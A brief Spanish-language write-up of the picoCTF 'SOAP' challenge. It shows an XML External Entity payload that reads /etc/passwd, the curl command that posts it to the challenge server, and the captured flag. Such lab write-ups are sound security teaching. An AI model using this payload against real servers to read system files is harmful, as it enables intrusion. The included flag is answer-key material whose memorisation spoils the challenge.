
# Reto 
### SOAP
## Descripcion
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:49868/)
## Solucion
```
1. **Creación del Payload Malicioso:** 
   Se preparó un archivo de texto llamado `payload.xml` definiendo una entidad externa que apunta al archivo local `/etc/passwd` del servidor.
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <data><ID>&xxe;</ID></data>

2. **Inyección con cURL:** Para evitar errores de sintaxis y escape de caracteres especiales (`<`, `>`, `&`) en la consola de Windows (CMD), se ejecutó la petición pasándole el archivo directamente mediante la bandera `-d @`:
    
    DOS
    
    ```
    curl "http://saturn.picoctf.net:53981/data" -H "Content-Type: application/xml" -d @payload.xml
    ```
    
3. **Obtención de la flag:** El servidor procesó el XML modificado, interpretó la entidad `&xxe;` y devolvió el contenido completo del archivo de contraseñas de Linux en la respuesta del terminal, donde se encontraba la bandera.
    

Plaintext

picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e}
```
## Notas adicionales 

## Referencias


